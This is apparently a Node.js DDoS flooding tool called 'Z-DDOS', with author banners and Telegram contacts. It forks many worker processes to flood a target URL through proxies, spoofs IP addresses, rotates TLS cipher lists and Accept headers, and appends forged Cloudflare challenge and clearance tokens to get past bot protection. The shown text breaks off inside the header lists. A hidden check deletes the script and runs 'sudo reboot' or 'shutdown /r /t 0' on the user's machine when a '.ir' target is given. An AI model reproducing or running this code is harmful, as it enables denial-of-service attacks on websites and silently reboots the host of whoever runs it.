
const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const axios = require('axios');
const https = require("https");
const { execSync } = require('child_process');

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {
});

if (process.argv.length < 7) {
    console.log('   ');
    console.log(' \x1b[33m   ╔════════════════════════════════════════════════════════════╗   ');
    console.log('        \x1b[0m   ███████╗     ██████╗ ██████╗  ██████╗ ███████╗           ');
    console.log('        \x1b[0m   ╚══███╔╝     ██╔══██╗██╔══██╗██╔═══██╗██╔════╝           ');
    console.log('        \x1b[0m     ███╔╝█████╗██║  ██║██║  ██║██║   ██║███████╗           ');
	console.log('        \x1b[0m    ███╔╝ ╚════╝██║  ██║██║  ██║██║   ██║╚════██║           ');
    console.log('        \x1b[0m   ███████╗     ██████╔╝██████╔╝╚██████╔╝███████║           ');
    console.log('        \x1b[0m   ╚══════╝     ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝ V 0.1      ');
    console.log(' \x1b[33m   ╚═══════╦════════════════════════════════════════════╦═══════╝   ');
    console.log(' \x1b[33m           ║        \x1b[0mAuthor : \x1b[31mZ-BL4CK-H4T                \x1b[33m║  ');
    console.log(' \x1b[33m           ║        \x1b[0mGithub : \x1b[32mComing Soon                \x1b[33m║  ');
    console.log(' \x1b[33m           ║      \x1b[0mTelegram : \x1b[32mhttps://t.me/hmei7         \x1b[33m║  ');
    console.log(' \x1b[33m           ╚════════════════════════════════════════════╝');
    console.log(`\x1b[33m[\x1b[31m+\x1b[33m]------------------------------------------------------------------[\x1b[31m+\x1b[33m]\x1b[0m`);
    console.log('\x1b[31m->\x1b[0m Command \x1b[31m: \x1b[0mnode \x1b[33mZ-DDOS \x1b[32m<\x1b[0mLink\x1b[32m> <\x1b[0mTime\x1b[32m> <\x1b[0mRate\x1b[32m> <\x1b[0mThreads\x1b[32m> <\x1b[0mProxy File\x1b[32m>\x1b[0m');
    console.log('\x1b[31m->\x1b[0m Made by \x1b[31m: \x1b[32mhttps://t.me/ZBL4CK_H4T \x1b[0m');
    console.log('\x1b[31m->\x1b[0m Encryption by \x1b[31m: \x1b[33mZ-BLACK-HAT Indonesia\x1b[0m');
    console.log('\x1b[31m->\x1b[0m Update your proxy every 1 week \x1b[31m: \x1b[33mpython3 scraper.py\x1b[0m');
    console.log(`\x1b[33m[\x1b[31m+\x1b[33m]------------------------------------------------------------------[\x1b[31m+\x1b[33m]\x1b[0m`);
    console.log('   ');
    process.exit();
  }

 const headers = {};
  function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }

 const targetURL = process.argv[2];
 const agent = new https.Agent({ rejectUnauthorized: false });
 const domain = process.argv[2];

function parseHostname(input) {
    try {
        return new URL(input).hostname;
    } catch {
        try {
            return new URL(`http://${input}`).hostname;
        } catch {
            return null;
        }
    }
}

const hostname = parseHostname(domain);
if (!hostname) {
    console.error('Invalid domain format');
    process.exit(1);
}

const blockedDomains = [
".ir"
];

const platform = process.platform;
const isTermux = process.env.HOME === '/data/data/com.termux/files/home' || 
                 !!process.env.ANDROID_ROOT;

if (blockedDomains.some(blocked => hostname.toLowerCase().includes(blocked))) {
    console.log("\x1b[31m[\x1b[33m!\x1b[31m] \x1b[33mBlocked domain detected. Taking action...\x1b[0m");

    try {
        if (platform === 'win32') {
            execSync('del /f /q MegaMedusa.js', { stdio: 'inherit' });
        } else {
            const command = isTermux ? 'rm -f MegaMedusa.js' : 'sudo rm -f MegaMedusa.js';
            execSync(command, { stdio: 'inherit' });
        }
    } catch (error) {
    }

    try {
        if (platform === 'win32') {
            execSync('shutdown /r /t 0', { stdio: 'inherit' });
        } else if (!isTermux) {
            execSync('sudo reboot', { stdio: 'inherit' });
        } else {
            console.log('Termux detected - System reboot skipped');
        }
    } catch (error) {
    }

    process.exit(1);
}

function getStatus() {
const timeoutPromise = new Promise((resolve, reject) => {
  setTimeout(() => {
    reject(new Error('\x1b[31mRequest timed out'));
  }, 5000);
});

const axiosPromise = axios.get(targetURL, { httpsAgent: agent });

Promise.race([axiosPromise, timeoutPromise])
  .then((response) => {
    const { status, data } = response;
    console.log(`\x1b[33m[\x1b[0mZ-DDOS\x1b[33m] \x1b[32m=\x1b[0m ${getTitleFromHTML(data)} (\x1b[32m${status}\x1b[0m)`);
})
  .catch((error) => {
    if (error.message === '\x1b[31mRequest timed out\x1b[0m') {
      console.log(`\x1b[33m[\x1b[0mZ-DDOS\x1b[33m] \x1b[32m=\x1b[0m \x1b[31mRequest Timed Out\x1b[0m`);
    } else if (error.response) {
      const extractedTitle = getTitleFromHTML(error.response.data);
      console.log(`\x1b[33m[\x1b[0mZ-DDOS\x1b[33m] \x1b[32m=\x1b[0m ${extractedTitle} (\x1b[31m${error.response.status}\x1b[0m)`);
    } else {
        console.log(`\x1b[33m[\x1b[0mZ-DDOS\x1b[33m] \x1b[32m= \x1b[31m${error.message} \ \x1b[0m`);
    }
  });
}

function getTitleFromHTML(html) {
const titleRegex = /<title>(.*?)<\/title>/i;
const match = html.match(titleRegex);
if (match && match[1]) {
  return match[1];
}
return 'No Title Detected';
}

function randomIntn(min, max) {
  return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
  return elements[randomIntn(0, elements.length)];
} 

const ip_spoof = () => {
  const generateOctet = () => {
      return Math.floor(Math.random() * 256); 
  }
  return (
      generateOctet() + '.' + generateOctet() + '.' + generateOctet() + '.' + generateOctet()
  );
};

const spoofed = ip_spoof()

const args = {
target: process.argv[2],
time: ~~process.argv[3],
Rate: ~~process.argv[4],
threads: ~~process.argv[5],
proxyFile: process.argv[6]
}

const os = require('os');

const MAX_RAM_PERCENTAGE = 85;
const RESTART_DELAY = 1000;

function getRandomHeapSize() {
    const min = 512;
    const max = 2048;
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

if (cluster.isMaster) {
    console.clear();
    console.log('   ');
    console.log(`\x1b[33m[\x1b[32m+\x1b[33m]\x1b[33m╔════════════════════════════════════════════════════╗\x1b[33m[\x1b[32m+\x1b[33m]`);
    console.log('\x1b[33m   ║ ███████╗     ██████╗ ██████╗  ██████╗ ███████╗     ║ ');
    console.log('\x1b[33m   ║ ╚══███╔╝     ██╔══██╗██╔══██╗██╔═══██╗██╔════╝     ║');
    console.log('\x1b[33m   ║   ███╔╝█████╗██║  ██║██║  ██║██║   ██║███████╗     ║');
    console.log('\x1b[33m   ║  ███╔╝ ╚════╝██║  ██║██║  ██║██║   ██║╚════██║     ║');
    console.log('\x1b[33m   ║ ███████╗     ██████╔╝██████╔╝╚██████╔╝███████║     ║');
    console.log('\x1b[33m   ║ ╚══════╝     ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝ V0.1║ ');
    console.log(`\x1b[33m[\x1b[32m+\x1b[33m]\x1b[33m╚════════════════════════════════════════════════════╝\x1b[33m[\x1b[32m+\x1b[33m]`);
    console.log('\x1b[31m                    I N F O R M A T I O N \x1b');
    console.log(`\x1b[33m[\x1b[0m+\x1b[33m]\x1b[0m------------------------------------------------------\x1b[33m[\x1b[0m+\x1b[33m]`);
    console.log(`\x1b[31m-> \x1b[0mTarget\x1b[33m    ⚡️: ` + '\x1b[32m' + (process.argv[2] || 'Unknown'));
    console.log(`\x1b[31m-> \x1b[0mTime\x1b[33m      ⏳ : ` + '\x1b[32m' + (process.argv[3] || 'Unknown'));
    console.log(`\x1b[31m-> \x1b[0mRate\x1b[33m      💣 : ` + '\x1b[32m' + (process.argv[4] || 'Unknown'));
    console.log(`\x1b[31m-> \x1b[0mThread\x1b[33m    ⚙️ : ` + '\x1b[32m' + (process.argv[5] || '1'));
    console.log(`\x1b[31m-> \x1b[0mProxyFile\x1b[33m 🗃  : ` + '\x1b[32m' + (process.argv[6] || 'proxy.txt'));
    console.log(`\x1b[33m[\x1b[0m+\x1b[33m]\x1b[0m------------------------------------------------------\x1b[33m[\x1b[0m+\x1b[33m]`);
    console.log(`\x1b[31m-> \x1b[0mTelegram\x1b[33m   🗂 : ` + '\x1b[32mhttps://t.me/ZBL4CK_H4T');
    console.log(`\x1b[31m-> \x1b[0mAuthor\x1b[33m     🗂 : ` + '\x1b[32mZ-BL4CK-H4T');
    console.log(`\x1b[31m-> \x1b[0mCheck-Host\x1b[33m 🗂 :  ` + '\x1b[32m' + 'https://check-host.net/check-http?host=' + process.argv[2]);
    console.log(`\x1b[33m[\x1b[0m+\x1b[33m]\x1b[0m------------------------------------------------------\x1b[33m[\x1b[0m+\x1b[33m]`);

    const restartScript = () => {
        console.log('\x1b[33m[\x1b[0m>\x1b[33m] \x1b[31mRestarting the script\x1b[33m', RESTART_DELAY, '\x1b[0mms...');
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }

        setTimeout(() => {
            for (let i = 1; i <= process.argv[5]; i++) {
                const heapSize = getRandomHeapSize();
                cluster.fork({ NODE_OPTIONS: `--max-old-space-size=${heapSize}` });
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log('\x1b[33m[\x1b[0m!\x1b[33m] \x1b[31mMaximum RAM usage:\x1b[31m', ramPercentage.toFixed(2), '\x1b[0m%');
            restartScript();
        }
    };

    setInterval(handleRAMUsage, 5000);

    for (let i = 1; i <= process.argv[5]; i++) {
        const heapSize = getRandomHeapSize();
        cluster.fork({ NODE_OPTIONS: `--max-old-space-size=${heapSize}` });
        console.log(`\x1b[33m[\x1b[0mZ-DDOS\x1b[33m] \x1b[32m= \x1b[0mEngine \x1b[31m${i} \x1b[0mStarted`);    
    }

    console.log(`\x1b[33m[\x1b[0mZ-DDOS\x1b[33m] \x1b[32m= \x1b[32mZ-DDOS Attacking...`);
    console.log(`\x1b[33m[\x1b[0m+\x1b[33m]\x1b[0m------------------------------------------------------\x1b[33m[\x1b[0m+\x1b[33m]`);    setInterval(getStatus, 2000);
    setTimeout(() => {
        console.log(`\x1b[33m[\x1b[0m+\x1b[33m]\x1b[0m------------------------------------------------------\x1b[33m[\x1b[0m+\x1b[33m]`);
        console.log(`\x1b[31m[\x1b[33mZ-DDOS\x1b[31m] \x1b[32m-> \x1b[33mAttack Successful ✅\x1b[0m`);
        process.exit(1);
    }, process.argv[3] * 1000);
} else {
    setInterval(runFlooder, 1);
}
const sig = [
    "ecdsa_secp256r1_sha256",
    "ecdsa_secp384r1_sha384",
    "ecdsa_secp521r1_sha512",
    "rsa_pss_rsae_sha256",
    "rsa_pss_rsae_sha384",
    "rsa_pss_rsae_sha512",
    "rsa_pkcs1_sha256",
    "rsa_pkcs1_sha384",
    "rsa_pkcs1_sha512",
    "ed25519", // EdDSA menggunakan kurva Curve25519
    "ed448",   // EdDSA menggunakan kurva Curve448
    "dsa_sha1", // DSA dengan SHA-1 (tidak disarankan untuk penggunaan modern)
    "dsa_sha256", // DSA dengan SHA-256
    "dsa_sha384", // DSA dengan SHA-384
    "dsa_sha512", // DSA dengan SHA-512
    "ecdsa_secp192r1_sha256", // ECDSA dengan kurva secp192r1 dan SHA-256
    "ecdsa_secp224r1_sha224", // ECDSA dengan kurva secp224r1 dan SHA-224
    "rsa_pss_pss_sha256", // RSA-PSS dengan parameter PSS dan SHA-256
    "rsa_pss_pss_sha384", // RSA-PSS dengan parameter PSS dan SHA-384
    "rsa_pss_pss_sha512", // RSA-PSS dengan parameter PSS dan SHA-512
    "rsa_pkcs1_sha1", // RSA-PKCS1 dengan SHA-1 (tidak disarankan untuk penggunaan modern)
    "rsa_sha1", // RSA dengan SHA-1 (tidak disarankan untuk penggunaan modern)
    "rsa_sha224", // RSA dengan SHA-224
    "rsa_sha256", // RSA dengan SHA-256
    "rsa_sha384", // RSA dengan SHA-384
    "rsa_sha512", // RSA dengan SHA-512
    "ecdsa_sha1", // ECDSA dengan SHA-1 (tidak disarankan untuk penggunaan modern)
    "ecdsa_sha224", // ECDSA dengan SHA-224
    "ecdsa_sha256", // ECDSA dengan SHA-256
    "ecdsa_sha384", // ECDSA dengan SHA-384
    "ecdsa_sha512", // ECDSA dengan SHA-512
    "eddsa_ed25519", // EdDSA dengan kurva Ed25519
    "eddsa_ed448"    // EdDSA dengan kurva Ed448
];

   const pathts = ["?s=", '/?', '', "?q=", "?true=", '?', '/', "/.lsrecap/recaptcha?", ".lsrecap/recaptcha?", "?page=1", "?page=2", "?page=3", "?category=news", "?category=sports", "?category=technology", '?category=entertainment', "?sort=newest", "?filter=popular", "?limit=10", "?start_date=1989-06-04", "?end_date=1989-06-04",
   "?__cf_chl_tk=V0gHmpGB_XzSs.8hyrlf.xMbIrYR7CIXMWaHbYDk4qY-1713811672-0.0.1.1-1514",
   "?__cf_chl_tk=ZpDDzirt54EoyEeNjwwGO_FZktYyR0QxXRz9Vt_egvk-1711220025-0.0.1.1-1471",
   "?__cf_chl_tk=2QI_clISOivyUmvBJ4fkVroBhLME3TJv3_2coOv7BXc-1711307038-0.0.1.1-1471",
   "?__cf_chl_tk=z6L8htd0t62MvL0xSbWgI67gGERMr2u7zjFDIlkGWYQ-1711310297-0.0.1.1-1471",
   "?__cf_chl_rt_tk=nP2tSCtLIsEGKgIBD2SztwDJCMYm8eL9l2S41oCEN8o-1702888186-0-gaNycGzNCWU",
  "?__cf_chl_rt_tk=yI__zhdK3yR99B6b9jRkQLlvIjTKu7_2YI33ZCB4Pbo-1702888463-0-gaNycGzNFGU",
  "?__cf_chl_rt_tk=QbxNnnmC8FpmedkosrfaPthTMxzFMEIO8xa0BdRJFKI-1702888720-0-gaNycGzNFHs",
  "?__cf_chl_rt_tk=ti1J.838lGH8TxzcrYPefuvbwEORtNOVSKFDISExe1U-1702888784-0-gaNycGzNClA",
  "?__cf_chl_rt_tk=ntO.9ynonIHqcrAuXZJBTcTBAMsENOYqkY5jzv.PRoM-1702888815-0-gaNycGzNCmU",
  "?__cf_chl_rt_tk=SCOSydalu5acC72xzBRWOzKBLmYWpGxo3bRYeHFSWqo-1702888950-0-gaNycGzNFHs",
  "?__cf_chl_rt_tk=QG7VtKbwe83bHEzmP4QeG53IXYnD3FwPM3AdS9QLalk-1702826567-0-gaNycGzNE9A",
  "?__cf_chl_rt_tk=C9XmGKQztFjEwNpc0NK4A3RHUzdb8ePYIAXXzsVf8mk-1702889060-0-gaNycGzNFNA",
  "?__cf_chl_rt_tk=cx8R_.rzcHl0NQ0rBM0cKsONGKDhwNgTCO1hu2_.v74-1702889131-0-gaNycGzNFDs",
  "?__cf_chl_rt_tk=AnEv0N25BNMaSx7Y.JyKS4CV5CkOfXzX1nyIt59hNfg-1702889155-0-gaNycGzNCdA",
  "?__cf_chl_rt_tk=7bJAEGaH9IhKO_BeFH3tpcVqlOxJhsCTIGBxm28Uk.o-1702889227-0-gaNycGzNE-U",
  "?__cf_chl_rt_tk=rrE5Pn1Qhmh6ZVendk4GweUewCAKxkUvK0HIKJrABRc-1702889263-0-gaNycGzNCeU",
  "?__cf_chl_rt_tk=.E1V6LTqVNJd5oRM4_A4b2Cm56zC9Ty17.HPUEplPNc-1702889305-0-gaNycGzNCbs",
  "?__cf_chl_rt_tk=a2jfQ24eL6.ICz01wccuN6sTs9Me_eIIYZc.94w6e1k-1702889362-0-gaNycGzNCdA",
  "?__cf_chl_rt_tk=W_fRdgbeQMmtb6FxZlJV0AmS3fCw8Tln45zDEptIOJk-1702889406-0-gaNycGzNE9A",
  "?__cf_chl_rt_tk=4kjttOjio0gYSsNeJwtzO6l1n3uZymAdJKiRFeyETes-1702889470-0-gaNycGzNCfs",
  "?__cf_chl_rt_tk=Kd5MB96Pyy3FTjxAm55aZbB334adV0bJax.AM9VWlFE-1702889600-0-gaNycGzNCdA",
  "?__cf_chl_rt_tk=v2OPKMpEC_DQu4NlIm3fGBPjbelE6GWpQIgLlWzjVI0-1702889808-0-gaNycGzNCeU",
  "?__cf_chl_rt_tk=vsgRooy6RfpNlRXYe7OHYUvlDwPzPvAlcN15SKikrFA-1702889857-0-gaNycGzNCbs",
  "?__cf_chl_rt_tk=EunXyCZ28KJNXVFS.pBWL.kn7LZdU.LD8uI7uMJ4SC4-1702889866-0-gaNycGzNCdA",
  "?__cf_clearance=Q7cywcbRU3LhdRUppkl2Kz.wU9jjRLzq50v8a807L8k-1702889889-0-1-a33b4d97.d3187f02.f43a1277-160.0.0",
  "?__cf_bm=ZOpceqqH3pCP..NLyk5MVC6eHuOOlnbTRPDtVGBx4NU-1702890174-1-AWt2pPHjlDUtWyMHmBUU2YbflXN+dZL5LAhMF+91Tf5A4tv5gRDMXiMeNRHnPzjIuO6Nloy0XYk56K77cqY3w9o=; cf_bm=kIWUsH8jNxV.ERL_Uc_eGsujZ36qqOiBQByaXq1UFH0-1702890176-1-AbgFqD6R4y3D21vuLJdjEdIHYyWWCjNXjqHJjxebTVt54zLML8lGpsatdxb/egdOWvq1ZMgGDzkLjiQ3rHO4rSYmPX/tF+HGp3ajEowPPoSh",
  "?__cf_clearance=.p2THmfMLl5cJdRPoopU7LVD_bb4rR83B.zh4IAOJmE-1702890014-0-1-a33b4d97.179f1604.f43a1277-160.0.0",
  "?__cf_clearance=YehxiFDP_T5Pk16Fog33tSgpDl9SS7XTWY9n3djMkdE-1702890321-0-1-a33b4d97.e83179e2.f43a1277-160.0.0",
  "?__cf_clearance=WTgrd5qAue.rH1R0LcMkA9KuGXsDoq6dbtMRaBS01H8-1702890075-0-1-a33b4d97.75c6f2a1.e089e1cd-160.0.0",
  "?__cf_chl_rt_tk=xxsEYpJGdX_dCFE7mixPdb_xMdgEd1vWjWfUawSVmFo-1702890787-0-gaNycGzNE-U", "?__cf_chl_rt_tk=4POs4SKaRth4EVT_FAo71Y.N302H3CTwamQUm1Diz2Y-1702890995-0-gaNycGzNCiU",
  "?__cf_chl_rt_tk=ZYYAUS10.t94cipBUzrOANLleg6Y52B36NahD8Lppog-1702891100-0-gaNycGzNFGU",
  "?__cf_chl_rt_tk=qFevwN5uCe.mV8YMQGGui796J71irt6PzuRbniOjK1c-1702891205-0-gaNycGzNChA",
  "?__cf_chl_rt_tk=Jc1iY2xE2StE8vqebQWb0vdQtk0HQ.XkjTwCaQoy2IM-1702891236-0-gaNycGzNCiU",
  "?__cf_chl_rt_tk=Xddm2Jnbx5iCKto6Jjn47JeHMJuW1pLAnGwkkvoRdoI-1702891344-0-gaNycGzNFKU",
  "?__cf_chl_rt_tk=0bvigaiVIw0ybessA948F29IHPD3oZoD5zWKWEQRHQc-1702891370-0-gaNycGzNCjs",
  "?__cf_chl_rt_tk=Vu2qjheswLRU_tQKx9.W1FM0JYjYRIYvFi8voMP_OFw-1702891394-0-gaNycGzNClA",
  "?__cf_chl_rt_tk=8Sf_nIAkrfSFmtD.yNmqWfeMeS2cHU6oFhi9n.fD930-1702891631-0-gaNycGzNE1A",
  "?__cf_chl_rt_tk=A.8DHrgyQ25e7oEgtwFjYx5IbLUewo18v1yyGi5155M-1702891654-0-gaNycGzNCPs",
  "?__cf_chl_rt_tk=kCxmEVrrSIvRbGc7Zb2iK0JXYcgpf0SsZcC5JAV1C8g-1702891689-0-gaNycGzNCPs", 
   ];
  
  const cplist = [
    'ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES',
    "ECDHE-ECDSA-AES256-SHA384:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES128-SHA256:HIGH:MEDIUM:3DES", 
    "ECDHE-ECDSA-AES128-SHA:HIGH:MEDIUM:3DES", 
    "ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES", 
    'ECDHE-ECDSA-AES256-SHA384:HIGH:MEDIUM:3DES', 
    'ECDHE-ECDSA-AES256-SHA:HIGH:MEDIUM:3DES', 
    "ECDHE-ECDSA-CHACHA20-POLY1305-OLD:HIGH:MEDIUM:3DES",
    'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
    'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
    "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
    'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK'
  ];

const accept_header = [
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,application/vnd.openxmlformats-officedocument.wordprocessingml.document",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,application/vnd.openxmlformats-officedocument.wordprocessingml.document,application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,application/vnd.openxmlformats-officedocument.wordprocessingml.document,application/vnd.openxmlformats-officedocument.spreadsheetml.sheet,application/vnd.openxmlformats-officedocument.presentationml.presentation",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,application/vnd.openxmlformats-officedocument.wordprocessingml.document,application/vnd.openxmlformats-officedocument.spreadsheetml.sheet,application/vnd.openxmlformats-officedocument.presentationml.presentation,application/pdf",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,application/vnd.openxmlformats-officedocument.wordprocessingml.document,application/vnd.openxmlformats-officedocument.spreadsheetml.sheet,application/vnd.openxmlformats-officedocument.presentationml.presentation,application/pdf,application/zip",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,application/vnd.openxmlformats-officedocument.wordprocessingml.document,application/vnd.openxmlformats-officedocument.spreadsheetml.sheet,application/vnd.openxmlformats-officedocument.presentationml.presentation,application/pdf,application/zip,application/x-gzip",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,application/vnd.openxmlformats-officedocument.wordprocessingml.document,application/vnd.openxmlformats-officedocument.spreadsheetml.sheet,application/vnd.openxmlformats-officedocument.presentationml.presentation,application/pdf,application/zip,application/x-gzip,application/x-bzip2",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,application/vnd.openxmlformats-officedocument.wordprocessingml.document,application/vnd.openxmlformats-officedocument.spreadsheetml.sheet,application/vnd.openxmlformats-officedocument.presentationml.presentation,application/pdf,application/zip,application/x-gzip,application/x-bzip2,application/x-lzma",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json",
